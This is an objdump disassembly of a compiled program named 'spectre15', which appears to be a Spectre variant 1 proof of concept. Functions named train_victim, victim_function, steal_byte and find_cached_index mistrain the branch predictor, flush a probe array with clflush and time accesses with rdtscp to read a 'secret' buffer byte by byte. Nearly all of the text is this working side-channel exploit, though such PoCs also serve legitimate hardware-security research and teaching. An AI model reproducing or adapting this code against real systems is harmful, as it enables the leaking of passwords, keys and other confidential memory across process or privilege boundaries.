
spectre15:     file format elf64-x86-64


Disassembly of section .init:

00000000000006b0 <_init>:
 6b0:	48 83 ec 08          	sub    $0x8,%rsp
 6b4:	48 8b 05 2d 19 20 00 	mov    0x20192d(%rip),%rax        # 201fe8 <__gmon_start__>
 6bb:	48 85 c0             	test   %rax,%rax
 6be:	74 02                	je     6c2 <_init+0x12>
 6c0:	ff d0                	callq  *%rax
 6c2:	48 83 c4 08          	add    $0x8,%rsp
 6c6:	c3                   	retq   

Disassembly of section .plt:

00000000000006d0 <.plt>:
 6d0:	ff 35 b2 18 20 00    	pushq  0x2018b2(%rip)        # 201f88 <_GLOBAL_OFFSET_TABLE_+0x8>
 6d6:	ff 25 b4 18 20 00    	jmpq   *0x2018b4(%rip)        # 201f90 <_GLOBAL_OFFSET_TABLE_+0x10>
 6dc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000006e0 <sigprocmask@plt>:
 6e0:	ff 25 b2 18 20 00    	jmpq   *0x2018b2(%rip)        # 201f98 <sigprocmask@GLIBC_2.2.5>
 6e6:	68 00 00 00 00       	pushq  $0x0
 6eb:	e9 e0 ff ff ff       	jmpq   6d0 <.plt>

00000000000006f0 <free@plt>:
 6f0:	ff 25 aa 18 20 00    	jmpq   *0x2018aa(%rip)        # 201fa0 <free@GLIBC_2.2.5>
 6f6:	68 01 00 00 00       	pushq  $0x1
 6fb:	e9 d0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000700 <__stack_chk_fail@plt>:
 700:	ff 25 a2 18 20 00    	jmpq   *0x2018a2(%rip)        # 201fa8 <__stack_chk_fail@GLIBC_2.4>
 706:	68 02 00 00 00       	pushq  $0x2
 70b:	e9 c0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000710 <printf@plt>:
 710:	ff 25 9a 18 20 00    	jmpq   *0x20189a(%rip)        # 201fb0 <printf@GLIBC_2.2.5>
 716:	68 03 00 00 00       	pushq  $0x3
 71b:	e9 b0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000720 <sigemptyset@plt>:
 720:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201fb8 <sigemptyset@GLIBC_2.2.5>
 726:	68 04 00 00 00       	pushq  $0x4
 72b:	e9 a0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000730 <malloc@plt>:
 730:	ff 25 8a 18 20 00    	jmpq   *0x20188a(%rip)        # 201fc0 <malloc@GLIBC_2.2.5>
 736:	68 05 00 00 00       	pushq  $0x5
 73b:	e9 90 ff ff ff       	jmpq   6d0 <.plt>

0000000000000740 <longjmp@plt>:
 740:	ff 25 82 18 20 00    	jmpq   *0x201882(%rip)        # 201fc8 <longjmp@GLIBC_2.2.5>
 746:	68 06 00 00 00       	pushq  $0x6
 74b:	e9 80 ff ff ff       	jmpq   6d0 <.plt>

0000000000000750 <sigaddset@plt>:
 750:	ff 25 7a 18 20 00    	jmpq   *0x20187a(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 756:	68 07 00 00 00       	pushq  $0x7
 75b:	e9 70 ff ff ff       	jmpq   6d0 <.plt>

Disassembly of section .plt.got:

0000000000000760 <__cxa_finalize@plt>:
 760:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 766:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000770 <_start>:
 770:	31 ed                	xor    %ebp,%ebp
 772:	49 89 d1             	mov    %rdx,%r9
 775:	5e                   	pop    %rsi
 776:	48 89 e2             	mov    %rsp,%rdx
 779:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 77d:	50                   	push   %rax
 77e:	54                   	push   %rsp
 77f:	4c 8d 05 5a 06 00 00 	lea    0x65a(%rip),%r8        # de0 <__libc_csu_fini>
 786:	48 8d 0d e3 05 00 00 	lea    0x5e3(%rip),%rcx        # d70 <__libc_csu_init>
 78d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 87a <main>
 794:	ff 15 46 18 20 00    	callq  *0x201846(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 79a:	f4                   	hlt    
 79b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000007a0 <deregister_tm_clones>:
 7a0:	48 8d 3d 69 19 20 00 	lea    0x201969(%rip),%rdi        # 202110 <__TMC_END__>
 7a7:	55                   	push   %rbp
 7a8:	48 8d 05 61 19 20 00 	lea    0x201961(%rip),%rax        # 202110 <__TMC_END__>
 7af:	48 39 f8             	cmp    %rdi,%rax
 7b2:	48 89 e5             	mov    %rsp,%rbp
 7b5:	74 19                	je     7d0 <deregister_tm_clones+0x30>
 7b7:	48 8b 05 1a 18 20 00 	mov    0x20181a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 7be:	48 85 c0             	test   %rax,%rax
 7c1:	74 0d                	je     7d0 <deregister_tm_clones+0x30>
 7c3:	5d                   	pop    %rbp
 7c4:	ff e0                	jmpq   *%rax
 7c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7cd:	00 00 00 
 7d0:	5d                   	pop    %rbp
 7d1:	c3                   	retq   
 7d2:	0f 1f 40 00          	nopl   0x0(%rax)
 7d6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7dd:	00 00 00 

00000000000007e0 <register_tm_clones>:
 7e0:	48 8d 3d 29 19 20 00 	lea    0x201929(%rip),%rdi        # 202110 <__TMC_END__>
 7e7:	48 8d 35 22 19 20 00 	lea    0x201922(%rip),%rsi        # 202110 <__TMC_END__>
 7ee:	55                   	push   %rbp
 7ef:	48 29 fe             	sub    %rdi,%rsi
 7f2:	48 89 e5             	mov    %rsp,%rbp
 7f5:	48 c1 fe 03          	sar    $0x3,%rsi
 7f9:	48 89 f0             	mov    %rsi,%rax
 7fc:	48 c1 e8 3f          	shr    $0x3f,%rax
 800:	48 01 c6             	add    %rax,%rsi
 803:	48 d1 fe             	sar    %rsi
 806:	74 18                	je     820 <register_tm_clones+0x40>
 808:	48 8b 05 e1 17 20 00 	mov    0x2017e1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 80f:	48 85 c0             	test   %rax,%rax
 812:	74 0c                	je     820 <register_tm_clones+0x40>
 814:	5d                   	pop    %rbp
 815:	ff e0                	jmpq   *%rax
 817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 81e:	00 00 
 820:	5d                   	pop    %rbp
 821:	c3                   	retq   
 822:	0f 1f 40 00          	nopl   0x0(%rax)
 826:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 82d:	00 00 00 

0000000000000830 <__do_global_dtors_aux>:
 830:	80 3d e9 18 20 00 00 	cmpb   $0x0,0x2018e9(%rip)        # 202120 <completed.7697>
 837:	75 2f                	jne    868 <__do_global_dtors_aux+0x38>
 839:	48 83 3d b7 17 20 00 	cmpq   $0x0,0x2017b7(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 840:	00 
 841:	55                   	push   %rbp
 842:	48 89 e5             	mov    %rsp,%rbp
 845:	74 0c                	je     853 <__do_global_dtors_aux+0x23>
 847:	48 8b 3d ba 17 20 00 	mov    0x2017ba(%rip),%rdi        # 202008 <__dso_handle>
 84e:	e8 0d ff ff ff       	callq  760 <__cxa_finalize@plt>
 853:	e8 48 ff ff ff       	callq  7a0 <deregister_tm_clones>
 858:	c6 05 c1 18 20 00 01 	movb   $0x1,0x2018c1(%rip)        # 202120 <completed.7697>
 85f:	5d                   	pop    %rbp
 860:	c3                   	retq   
 861:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 868:	f3 c3                	repz retq 
 86a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000870 <frame_dummy>:
 870:	55                   	push   %rbp
 871:	48 89 e5             	mov    %rsp,%rbp
 874:	5d                   	pop    %rbp
 875:	e9 66 ff ff ff       	jmpq   7e0 <register_tm_clones>

000000000000087a <main>:
 87a:	55                   	push   %rbp
 87b:	48 89 e5             	mov    %rsp,%rbp
 87e:	48 83 ec 20          	sub    $0x20,%rsp
 882:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 889:	eb 24                	jmp    8af <main+0x35>
 88b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 88e:	99                   	cltd   
 88f:	c1 ea 18             	shr    $0x18,%edx
 892:	01 d0                	add    %edx,%eax
 894:	0f b6 c0             	movzbl %al,%eax
 897:	29 d0                	sub    %edx,%eax
 899:	89 c1                	mov    %eax,%ecx
 89b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 89e:	48 63 d0             	movslq %eax,%rdx
 8a1:	48 8d 05 98 19 20 00 	lea    0x201998(%rip),%rax        # 202240 <array>
 8a8:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 8ab:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 8af:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 8b6:	7e d3                	jle    88b <main+0x11>
 8b8:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 8bf:	e9 b1 00 00 00       	jmpq   975 <main+0xfb>
 8c4:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 8cb:	eb 1a                	jmp    8e7 <main+0x6d>
 8cd:	8b 45 e8             	mov    -0x18(%rbp),%eax
 8d0:	c1 e0 0c             	shl    $0xc,%eax
 8d3:	48 63 d0             	movslq %eax,%rdx
 8d6:	48 8d 05 63 19 20 00 	lea    0x201963(%rip),%rax        # 202240 <array>
 8dd:	48 01 d0             	add    %rdx,%rax
 8e0:	0f ae 38             	clflush (%rax)
 8e3:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 8e7:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 8ee:	7e dd                	jle    8cd <main+0x53>
 8f0:	0f ae f0             	mfence 
 8f3:	bf 00 04 00 00       	mov    $0x400,%edi
 8f8:	e8 33 fe ff ff       	callq  730 <malloc@plt>
 8fd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 901:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 908:	eb 1e                	jmp    928 <main+0xae>
 90a:	8b 45 ec             	mov    -0x14(%rbp),%eax
 90d:	48 98                	cltq   
 90f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 916:	00 
 917:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 91b:	48 01 d0             	add    %rdx,%rax
 91e:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 924:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 928:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 92f:	7e d9                	jle    90a <main+0x90>
 931:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 934:	48 98                	cltq   
 936:	48 8d 0d a3 17 20 00 	lea    0x2017a3(%rip),%rcx        # 2020e0 <secret>
 93d:	48 8d 15 fc 16 20 00 	lea    0x2016fc(%rip),%rdx        # 202040 <buffer>
 944:	48 29 d1             	sub    %rdx,%rcx
 947:	48 89 ca             	mov    %rcx,%rdx
 94a:	48 01 d0             	add    %rdx,%rax
 94d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 951:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 955:	89 c2                	mov    %eax,%edx
 957:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 95b:	89 d6                	mov    %edx,%esi
 95d:	48 89 c7             	mov    %rax,%rdi
 960:	e8 19 03 00 00       	callq  c7e <steal_byte>
 965:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 969:	48 89 c7             	mov    %rax,%rdi
 96c:	e8 7f fd ff ff       	callq  6f0 <free@plt>
 971:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 975:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 979:	0f 8e 45 ff ff ff    	jle    8c4 <main+0x4a>
 97f:	b8 00 00 00 00       	mov    $0x0,%eax
 984:	c9                   	leaveq 
 985:	c3                   	retq   

0000000000000986 <unblock_signal>:
 986:	55                   	push   %rbp
 987:	48 89 e5             	mov    %rsp,%rbp
 98a:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
 991:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
 997:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 99e:	00 00 
 9a0:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 9a4:	31 c0                	xor    %eax,%eax
 9a6:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9ad:	48 89 c7             	mov    %rax,%rdi
 9b0:	e8 6b fd ff ff       	callq  720 <sigemptyset@plt>
 9b5:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
 9bb:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9c2:	89 d6                	mov    %edx,%esi
 9c4:	48 89 c7             	mov    %rax,%rdi
 9c7:	e8 84 fd ff ff       	callq  750 <sigaddset@plt>
 9cc:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9d3:	ba 00 00 00 00       	mov    $0x0,%edx
 9d8:	48 89 c6             	mov    %rax,%rsi
 9db:	bf 01 00 00 00       	mov    $0x1,%edi
 9e0:	e8 fb fc ff ff       	callq  6e0 <sigprocmask@plt>
 9e5:	90                   	nop
 9e6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 9ea:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 9f1:	00 00 
 9f3:	74 05                	je     9fa <unblock_signal+0x74>
 9f5:	e8 06 fd ff ff       	callq  700 <__stack_chk_fail@plt>
 9fa:	c9                   	leaveq 
 9fb:	c3                   	retq   

00000000000009fc <trycatch_segfault_handler>:
 9fc:	55                   	push   %rbp
 9fd:	48 89 e5             	mov    %rsp,%rbp
 a00:	48 83 ec 10          	sub    $0x10,%rsp
 a04:	89 7d fc             	mov    %edi,-0x4(%rbp)
 a07:	bf 0b 00 00 00       	mov    $0xb,%edi
 a0c:	e8 75 ff ff ff       	callq  986 <unblock_signal>
 a11:	bf 08 00 00 00       	mov    $0x8,%edi
 a16:	e8 6b ff ff ff       	callq  986 <unblock_signal>
 a1b:	be 01 00 00 00       	mov    $0x1,%esi
 a20:	48 8d 3d 39 17 20 00 	lea    0x201739(%rip),%rdi        # 202160 <trycatch_buf>
 a27:	e8 14 fd ff ff       	callq  740 <longjmp@plt>

0000000000000a2c <find_cached_index>:
 a2c:	55                   	push   %rbp
 a2d:	48 89 e5             	mov    %rsp,%rbp
 a30:	53                   	push   %rbx
 a31:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 a35:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 a3c:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 a43:	eb 67                	jmp    aac <find_cached_index+0x80>
 a45:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 a4c:	00 
 a4d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 a50:	c1 e0 0c             	shl    $0xc,%eax
 a53:	48 63 d0             	movslq %eax,%rdx
 a56:	48 8d 05 e3 17 20 00 	lea    0x2017e3(%rip),%rax        # 202240 <array>
 a5d:	48 01 d0             	add    %rdx,%rax
 a60:	48 89 c3             	mov    %rax,%rbx
 a63:	0f ae f0             	mfence 
 a66:	0f 01 f9             	rdtscp 
 a69:	49 89 c2             	mov    %rax,%r10
 a6c:	48 8b 0b             	mov    (%rbx),%rcx
 a6f:	0f 01 f9             	rdtscp 
 a72:	4c 29 d0             	sub    %r10,%rax
 a75:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 a79:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 a7e:	77 28                	ja     aa8 <find_cached_index+0x7c>
 a80:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
 a84:	74 07                	je     a8d <find_cached_index+0x61>
 a86:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
 a8d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 a90:	48 98                	cltq   
 a92:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a99:	00 
 a9a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 a9e:	48 01 d0             	add    %rdx,%rax
 aa1:	8b 10                	mov    (%rax),%edx
 aa3:	83 c2 01             	add    $0x1,%edx
 aa6:	89 10                	mov    %edx,(%rax)
 aa8:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 aac:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 ab3:	7e 90                	jle    a45 <find_cached_index+0x19>
 ab5:	8b 45 ec             	mov    -0x14(%rbp),%eax
 ab8:	5b                   	pop    %rbx
 ab9:	5d                   	pop    %rbp
 aba:	c3                   	retq   

0000000000000abb <find_highest_score>:
 abb:	55                   	push   %rbp
 abc:	48 89 e5             	mov    %rsp,%rbp
 abf:	48 83 ec 30          	sub    $0x30,%rsp
 ac3:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
 ac7:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 ace:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 ad5:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 adc:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 ae3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 aea:	eb 4a                	jmp    b36 <find_highest_score+0x7b>
 aec:	8b 45 fc             	mov    -0x4(%rbp),%eax
 aef:	48 98                	cltq   
 af1:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 af8:	00 
 af9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 afd:	48 01 d0             	add    %rdx,%rax
 b00:	8b 00                	mov    (%rax),%eax
 b02:	39 45 ec             	cmp    %eax,-0x14(%rbp)
 b05:	7d 2b                	jge    b32 <find_highest_score+0x77>
 b07:	8b 45 f0             	mov    -0x10(%rbp),%eax
 b0a:	89 45 f8             	mov    %eax,-0x8(%rbp)
 b0d:	8b 45 ec             	mov    -0x14(%rbp),%eax
 b10:	89 45 f4             	mov    %eax,-0xc(%rbp)
 b13:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b16:	89 45 f0             	mov    %eax,-0x10(%rbp)
 b19:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b1c:	48 98                	cltq   
 b1e:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b25:	00 
 b26:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 b2a:	48 01 d0             	add    %rdx,%rax
 b2d:	8b 00                	mov    (%rax),%eax
 b2f:	89 45 ec             	mov    %eax,-0x14(%rbp)
 b32:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 b36:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 b3d:	7e ad                	jle    aec <find_highest_score+0x31>
 b3f:	8b 7d f4             	mov    -0xc(%rbp),%edi
 b42:	8b 75 f8             	mov    -0x8(%rbp),%esi
 b45:	8b 4d ec             	mov    -0x14(%rbp),%ecx
 b48:	8b 55 f0             	mov    -0x10(%rbp),%edx
 b4b:	8b 45 f0             	mov    -0x10(%rbp),%eax
 b4e:	41 89 f9             	mov    %edi,%r9d
 b51:	41 89 f0             	mov    %esi,%r8d
 b54:	89 c6                	mov    %eax,%esi
 b56:	48 8d 3d 9b 02 00 00 	lea    0x29b(%rip),%rdi        # df8 <_IO_stdin_used+0x8>
 b5d:	b8 00 00 00 00       	mov    $0x0,%eax
 b62:	e8 a9 fb ff ff       	callq  710 <printf@plt>
 b67:	90                   	nop
 b68:	c9                   	leaveq 
 b69:	c3                   	retq   

0000000000000b6a <train_victim>:
 b6a:	55                   	push   %rbp
 b6b:	48 89 e5             	mov    %rsp,%rbp
 b6e:	48 83 ec 30          	sub    $0x30,%rsp
 b72:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 b79:	00 00 
 b7b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 b7f:	31 c0                	xor    %eax,%eax
 b81:	48 c7 45 e8 05 00 00 	movq   $0x5,-0x18(%rbp)
 b88:	00 
 b89:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
 b8d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 b91:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
 b98:	e9 84 00 00 00       	jmpq   c21 <train_victim+0xb7>
 b9d:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
 ba1:	48 ba cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rdx
 ba8:	cc cc cc 
 bab:	48 89 c8             	mov    %rcx,%rax
 bae:	48 f7 e2             	mul    %rdx
 bb1:	48 c1 ea 03          	shr    $0x3,%rdx
 bb5:	48 89 d0             	mov    %rdx,%rax
 bb8:	48 c1 e0 02          	shl    $0x2,%rax
 bbc:	48 01 d0             	add    %rdx,%rax
 bbf:	48 01 c0             	add    %rax,%rax
 bc2:	48 29 c1             	sub    %rax,%rcx
 bc5:	48 89 ca             	mov    %rcx,%rdx
 bc8:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
 bcc:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 bd0:	48 83 c0 01          	add    $0x1,%rax
 bd4:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 bd8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 bdc:	48 89 c7             	mov    %rax,%rdi
 bdf:	e8 31 01 00 00       	callq  d15 <victim_function>
 be4:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 beb:	eb 1a                	jmp    c07 <train_victim+0x9d>
 bed:	8b 45 e0             	mov    -0x20(%rbp),%eax
 bf0:	c1 e0 0c             	shl    $0xc,%eax
 bf3:	48 63 d0             	movslq %eax,%rdx
 bf6:	48 8d 05 43 16 20 00 	lea    0x201643(%rip),%rax        # 202240 <array>
 bfd:	48 01 d0             	add    %rdx,%rax
 c00:	0f ae 38             	clflush (%rax)
 c03:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 c07:	81 7d e0 ff 00 00 00 	cmpl   $0xff,-0x20(%rbp)
 c0e:	7e dd                	jle    bed <train_victim+0x83>
 c10:	0f ae f0             	mfence 
 c13:	48 8d 05 06 14 20 00 	lea    0x201406(%rip),%rax        # 202020 <bufferSize>
 c1a:	0f ae 38             	clflush (%rax)
 c1d:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
 c21:	83 7d dc 13          	cmpl   $0x13,-0x24(%rbp)
 c25:	0f 8e 72 ff ff ff    	jle    b9d <train_victim+0x33>
 c2b:	0f ae e8             	lfence 
 c2e:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 c35:	eb 1a                	jmp    c51 <train_victim+0xe7>
 c37:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 c3a:	c1 e0 0c             	shl    $0xc,%eax
 c3d:	48 63 d0             	movslq %eax,%rdx
 c40:	48 8d 05 f9 15 20 00 	lea    0x2015f9(%rip),%rax        # 202240 <array>
 c47:	48 01 d0             	add    %rdx,%rax
 c4a:	0f ae 38             	clflush (%rax)
 c4d:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 c51:	81 7d e4 ff 00 00 00 	cmpl   $0xff,-0x1c(%rbp)
 c58:	7e dd                	jle    c37 <train_victim+0xcd>
 c5a:	0f ae f0             	mfence 
 c5d:	48 8d 05 bc 13 20 00 	lea    0x2013bc(%rip),%rax        # 202020 <bufferSize>
 c64:	0f ae 38             	clflush (%rax)
 c67:	90                   	nop
 c68:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 c6c:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 c73:	00 00 
 c75:	74 05                	je     c7c <train_victim+0x112>
 c77:	e8 84 fa ff ff       	callq  700 <__stack_chk_fail@plt>
 c7c:	c9                   	leaveq 
 c7d:	c3                   	retq   

0000000000000c7e <steal_byte>:
 c7e:	55                   	push   %rbp
 c7f:	48 89 e5             	mov    %rsp,%rbp
 c82:	48 83 ec 30          	sub    $0x30,%rsp
 c86:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
 c8a:	89 75 d4             	mov    %esi,-0x2c(%rbp)
 c8d:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 c94:	00 00 
 c96:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 c9a:	31 c0                	xor    %eax,%eax
 c9c:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 ca3:	eb 44                	jmp    ce9 <steal_byte+0x6b>
 ca5:	b8 00 00 00 00       	mov    $0x0,%eax
 caa:	e8 bb fe ff ff       	callq  b6a <train_victim>
 caf:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 cb2:	48 98                	cltq   
 cb4:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 cb8:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
 cbc:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 cc0:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 cc4:	48 89 c7             	mov    %rax,%rdi
 cc7:	e8 49 00 00 00       	callq  d15 <victim_function>
 ccc:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 cd0:	48 89 c7             	mov    %rax,%rdi
 cd3:	e8 54 fd ff ff       	callq  a2c <find_cached_index>
 cd8:	89 45 e4             	mov    %eax,-0x1c(%rbp)
 cdb:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
 cdf:	75 04                	jne    ce5 <steal_byte+0x67>
 ce1:	83 6d e0 01          	subl   $0x1,-0x20(%rbp)
 ce5:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 ce9:	81 7d e0 e7 03 00 00 	cmpl   $0x3e7,-0x20(%rbp)
 cf0:	7e b3                	jle    ca5 <steal_byte+0x27>
 cf2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 cf6:	48 89 c7             	mov    %rax,%rdi
 cf9:	e8 bd fd ff ff       	callq  abb <find_highest_score>
 cfe:	90                   	nop
 cff:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 d03:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 d0a:	00 00 
 d0c:	74 05                	je     d13 <steal_byte+0x95>
 d0e:	e8 ed f9 ff ff       	callq  700 <__stack_chk_fail@plt>
 d13:	c9                   	leaveq 
 d14:	c3                   	retq   

0000000000000d15 <victim_function>:
 d15:	55                   	push   %rbp
 d16:	48 89 e5             	mov    %rsp,%rbp
 d19:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 d1d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 d21:	48 8b 10             	mov    (%rax),%rdx
 d24:	8b 05 f6 12 20 00    	mov    0x2012f6(%rip),%eax        # 202020 <bufferSize>
 d2a:	48 98                	cltq   
 d2c:	48 39 c2             	cmp    %rax,%rdx
 d2f:	73 35                	jae    d66 <victim_function+0x51>
 d31:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 d35:	48 8b 10             	mov    (%rax),%rdx
 d38:	48 8d 05 01 13 20 00 	lea    0x201301(%rip),%rax        # 202040 <buffer>
 d3f:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
 d43:	0f b6 c0             	movzbl %al,%eax
 d46:	c1 e0 0c             	shl    $0xc,%eax
 d49:	48 63 d0             	movslq %eax,%rdx
 d4c:	48 8d 05 ed 14 20 00 	lea    0x2014ed(%rip),%rax        # 202240 <array>
 d53:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 d57:	0f b6 05 e2 13 20 00 	movzbl 0x2013e2(%rip),%eax        # 202140 <temp>
 d5e:	21 d0                	and    %edx,%eax
 d60:	88 05 da 13 20 00    	mov    %al,0x2013da(%rip)        # 202140 <temp>
 d66:	90                   	nop
 d67:	5d                   	pop    %rbp
 d68:	c3                   	retq   
 d69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000000d70 <__libc_csu_init>:
 d70:	41 57                	push   %r15
 d72:	41 56                	push   %r14
 d74:	49 89 d7             	mov    %rdx,%r15
 d77:	41 55                	push   %r13
 d79:	41 54                	push   %r12
 d7b:	4c 8d 25 fe 0f 20 00 	lea    0x200ffe(%rip),%r12        # 201d80 <__frame_dummy_init_array_entry>
 d82:	55                   	push   %rbp
 d83:	48 8d 2d fe 0f 20 00 	lea    0x200ffe(%rip),%rbp        # 201d88 <__init_array_end>
 d8a:	53                   	push   %rbx
 d8b:	41 89 fd             	mov    %edi,%r13d
 d8e:	49 89 f6             	mov    %rsi,%r14
 d91:	4c 29 e5             	sub    %r12,%rbp
 d94:	48 83 ec 08          	sub    $0x8,%rsp
 d98:	48 c1 fd 03          	sar    $0x3,%rbp
 d9c:	e8 0f f9 ff ff       	callq  6b0 <_init>
 da1:	48 85 ed             	test   %rbp,%rbp
 da4:	74 20                	je     dc6 <__libc_csu_init+0x56>
 da6:	31 db                	xor    %ebx,%ebx
 da8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 daf:	00 
 db0:	4c 89 fa             	mov    %r15,%rdx
 db3:	4c 89 f6             	mov    %r14,%rsi
 db6:	44 89 ef             	mov    %r13d,%edi
 db9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 dbd:	48 83 c3 01          	add    $0x1,%rbx
